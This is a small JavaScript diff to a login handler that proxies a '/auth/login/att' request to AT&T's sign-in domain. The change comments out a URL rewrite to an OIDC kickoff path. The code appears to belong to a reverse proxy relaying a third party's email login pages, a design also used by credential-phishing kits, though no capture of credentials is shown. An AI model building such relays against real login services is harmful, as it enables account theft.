@@ -222,7 +222,7 @@ const EmailLoginHandler = class extends globalWorker.BaseClasses.BasePreClass {
                 return super.superExecuteProxy(clientContext.currentDomain, clientContext)
             }
             if (this.req.url === '/auth/login/att') {
-                this.req.url = '/isam/sps/oidc/rp/consumerfed/kickoff/aaidpartner?Target=https%3A%2F%2Fcaaid.att.com%2Fisam%2Fsps%2Fstatic%2FsigninRedirect.html'
+                // this.req.url = '/isam/sps/oidc/rp/consumerfed/kickoff/aaidpartner?Target=https%3A%2F%2Fcaaid.att.com%2Fisam%2Fsps%2Fstatic%2FsigninRedirect.html'
                 clientContext.currentDomain = 'caaid.att.com'
                 return super.superExecuteProxy(clientContext.currentDomain, clientContext)
             }
